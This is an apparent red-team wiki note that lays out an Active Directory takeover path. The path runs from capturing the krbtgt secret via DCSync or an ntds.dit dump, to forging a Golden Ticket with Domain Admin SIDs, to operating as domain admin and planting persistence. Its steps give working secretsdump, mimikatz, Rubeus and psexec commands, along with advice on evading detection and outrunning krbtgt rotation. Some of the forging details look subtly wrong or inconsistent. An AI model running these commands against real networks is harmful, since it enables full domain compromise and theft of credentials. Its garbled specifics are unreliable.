---
title: "Attack Path: DCSync → Golden Ticket → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, golden-ticket, dcsync, privilege-escalation, persistence]
---

# Attack Path: DCSync → Golden Ticket → Domain Admin

The **canonical "own the domain" path**: use a **DCSync right** (or an
offline [[ntds-dit]] dump) to capture the **`krbtgt`** secret, forge a
**[[golden-silver-tickets|Golden Ticket]]** for a privileged account (with
the `Domain Admins` SID), and be **Domain Admin** with a ticket that's
**long-lived and durable** (it survives the *user's* password change; only a
`krbtgt` rotation kills it). This is the base case the
[[path-diamond-ticket-to-domain-admin]] (the rotation-resistant AES128
variant) and the other `wiki/notes/` DA paths are variations of. See
[[golden-silver-tickets]] for the forgery mechanics and [[dcsync]] for the
key acquisition.

## Chain

```
You (a foothold holding a DCSync right, or a DC shell)
  --DCSync krbtgt (or offline ntds.dit dump)--> capture krbtgt NTLM + AES256 key
  --Golden Ticket (Rubeus asktgt /aes256)--> TGT for Administrator + Domain Admins (512)
  --(long-lived, survives user pw change)--> Domain Admin
  --(optional) [[ad-persistence]]--> durable DA (DCShadow / Skeleton Key / AdminSDHolder)
```

## Prerequisites / what signals this path exists

- **A DCSync right** — you hold `GetChanges`/`GetChangesAll` on the domain
  (a DA, a machine account with the rights, the Azure AD Connect account,
  etc.), **or** you have a **DC shell** (for the offline [[ntds-dit]] VSS
  dump — no ACLs needed). Confirm before committing:

```powershell
# Confirm the DCSync right (BloodHound DCSync edge)
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" }
```

- **The domain SID** — you need `S-1-5-21-...` for the forgery
  (`Get-ADDomain | Select DomainSid`, or `Get-Domain` in PowerView).

See [[dcsync]] for the replication right, [[golden-silver-tickets]] for the
forgery, [[krbtgt]] for the secret, [[secretsdump]] for the tool.

## Step 1 — Capture the `krbtgt` secret

```bash
# Online (DCSync right) — Impacket secretsdump, single account
secretsdump.py -k -no-pass corp.local/<dcsync-user>@dc01.corp.local -just-dc-user krbtgt
# output:
#   aes256-cts-hmac-sha1-96 : <64-hex>   <-- prefer this (avoids the RC4 tell)
#   aes128-cts-hmac-sha1-96 : <32-hex>
#   rc4_hmac_nt             : <nt-hash>  <-- the RC4 (louder) option

# Offline (DC shell, no DCSync right) — VSS snapshot of C: then dump the hives
#   (see [[ntds-dit]] for the VSS flow)
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit
```
```powershell
# Mimikatz (DCSync)
lsadump::dcsync /domain:corp.local /user:krbtgt
```

**Verify:** you captured the `krbtgt` **AES256** key (64-hex). If you only
have the RC4 hash, the Golden will be an RC4 TGT (a detection tell) — prefer
the AES256 key when you have it.

## Step 2 — Forge the Golden Ticket (AES256, with the DA SID)

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<64-hex> /sids:S-1-5-21-...:512 /ptt
Rubeus.exe triage        # TGT for Administrator, etype aes256
whoami /all              # corp.local\administrator + Domain Admins (512)
```

The TGT/PAC is signed with the **`krbtgt` AES256 key** and carries the
**Domain Admins SID (`512`)**. Using the AES256 key (not the RC4 hash) avoids
the RC4-downgrade tell. See [[golden-silver-tickets]].

**Verify:** `whoami /all` shows `corp.local\administrator` and the
**Domain Admins** group (RID 512).

### Failure modes & fallbacks
- **Only the RC4 hash** — `Rubeus.exe asktgt /user:... /rc4:<nt-hash> /sids:...:512
  /ptt`; works, but the TGT is RC4 (`0x17`) — a detection tell.
- **Ticket rejected** — wrong key/enctype pair or a wrong domain SID; rebuild
  with the exact `krbtgt` key and the correct `S-1-5-21-...`.
- **DC forces AES256 and you only have RC4** — the RC4 TGT may be rejected on
  a strict domain; re-capture the AES256 key (DCSync again) before forging.

## Step 3 — Operate as Domain Admin

```powershell
# Lateral / DCSync / anything, using the injected ticket (no password)
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@dc01.corp.local -just-dc   # domain-wide
```
You're now DA: enumerate the forest ([[ad-structure]]), plant
[[gpo-abuse]] / [[acl-abuse]], or move to persistence (step 4). See
[[remote-execution]] for the lateral transports.

## Step 4 — Persist (optional)

A Golden Ticket is **memory-only** (dies with the session). For durable DA,
layer [[ad-persistence]]: **[[dcshadow]]** (rogue replication / shadow-DC
DSRM), **[[skeleton-key]]** (the DC LSASS patch), or an **AdminSDHolder** ACE
— all of which survive the `krbtgt` rotation that would otherwise kill the
Golden. See [[ad-persistence]] for the hub.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (DCSync) | **4662** on the domain object (GetChanges + GetChangesAll) from a non-DC principal | a workstation replicating the directory |
| 1 (offline dump) | VSS creation + `ntds.dit` access on a DC | a shadow copy of `C:` then `NTDS` reads |
| 2 (Golden) | **4768 TGT with no matching prior 4768**, an **AES256/RC4 TGT carrying extra SIDs** (512) for an account, an **abnormally long ticket lifetime** | a DA TGT that never requested a TGT normally / lives for years |
| 3 (use) | 4624 type 3/9 across the domain for the DA | a DA authenticating from odd hosts |

## Cleanup notes
- **DCSync's trail is the 4662**; the offline dump's trail is the **VSS +
  `ntds.dit` access**. The Golden Ticket itself is **memory-only** (dies with
  the session) — no AD object to remove.
- If the defender **rotates `krbtgt` twice** ([[krbtgt]]), the Golden dies —
  so either **persist** (step 4) before they rotate, or move fast.
- The planted identity is a TGT, not an AD object — nothing to clean up in
  AD beyond the (optional) persistence you planted.

## Related
- [[golden-silver-tickets]] — the forgery primitive (step 2)
- [[dcsync]] — the key source (step 1, online)
- [[ntds-dit]] — the key source (step 1, offline)
- [[krbtgt]] — the secret being captured + the rotation model
- [[diamond-ticket]] — the rotation-resistant (AES128) variant of this path
- [[path-diamond-ticket-to-domain-admin]] — that variant's end-to-end chain
- [[ad-persistence]] — durable DA once you're in (step 4)
- [[secretsdump]] — the DCSync/offline-dump tool
- [[ccache]] — the ticket transport (Rubeus `export` / Impacket `.ccache`)
